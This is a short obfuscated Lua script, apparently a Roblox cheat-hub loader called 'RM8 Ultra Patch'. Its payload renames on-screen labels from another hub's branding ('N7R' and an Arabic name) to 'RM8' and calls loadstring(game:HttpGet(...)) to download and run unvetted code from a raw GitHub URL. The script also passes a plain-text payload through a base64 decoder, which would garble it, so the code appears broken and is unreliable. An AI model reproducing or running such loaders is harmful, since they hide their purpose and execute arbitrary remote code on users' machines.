-- RM8 Ultra Patch
local _0x724d8 = "function patch() local function rename(obj) for _, v in pairs(obj:GetDescendants()) do if v:IsA('TextLabel') or v:IsA('TextButton') then if v.Text:find('N7R') or v.Text:find('عالم المملكة') then v.Text = v.Text:gsub('N7R', 'RM8'):gsub('عالم المملكة', 'RM8 HUB') end end end end spawn(function() while task.wait(0.1) do patch() rename(game:GetService('CoreGui')) rename(game:GetService('Players').LocalPlayer.PlayerGui) end end) end patch() loadstring(game:HttpGet('https://raw.githubusercontent.com/kkmmai82/kkmmai82/refs/heads/main/Jdh'))()"
local function _0x524d(_0x61)
    local _0x62 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    _0x61 = string.gsub(_0x61, '[^'.._0x62..'=]', '')
    return (_0x61:gsub('.', function(_0x63)
        if (_0x63 == '=') then return '' end
        local _0x64, _0x65 = '', _0x62:find(_0x63) - 1
        for _0x66 = 6, 1, -1 do _0x64 = _0x64 .. (_0x65 % 2^_0x66 - _0x65 % 2^(_0x66 - 1) > 0 and '1' or '0') end
        return _0x64
    end):gsub('%d%d%d%d%d%d%d%d', function(_0x63)
        return string.char(tonumber(_0x63, 2))
    end))
end
loadstring(_0x524d(_0x724d8))()
